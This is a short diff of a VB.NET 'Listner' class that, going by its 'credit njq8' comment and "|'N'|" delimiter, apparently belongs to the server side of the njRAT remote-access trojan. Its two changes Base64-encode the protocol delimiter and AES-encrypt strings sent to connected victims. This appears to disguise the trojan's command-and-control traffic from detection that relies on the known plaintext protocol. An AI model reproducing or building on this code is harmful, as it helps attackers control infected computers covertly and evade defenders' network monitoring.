@@ -1,7 +1,7 @@
 ﻿Public Class Listner
     'credit njq8
     Public S As Net.Sockets.TcpListener
-    Public KEY As String = "|'N'|"
+    Public KEY As String = Convert.ToBase64String(SB("|'N'|"))
     Public Event Data(ByVal u As USER, ByVal b As Byte())
     Public Event Disconnected(ByVal u As USER)
     Public Event Connected(ByVal u As USER)
@@ -62,7 +62,7 @@ disconnect:
         End SyncLock
     End Sub
     Public Function Send(ByVal u As USER, ByVal s As String) As Boolean
-        Return Send(u, SB(s))
+        Return Send(u, SB(AES_Encrypt(s)))
     End Function
     Public Function Send(ByVal u As USER, ByVal b As Byte()) As Boolean
         Try
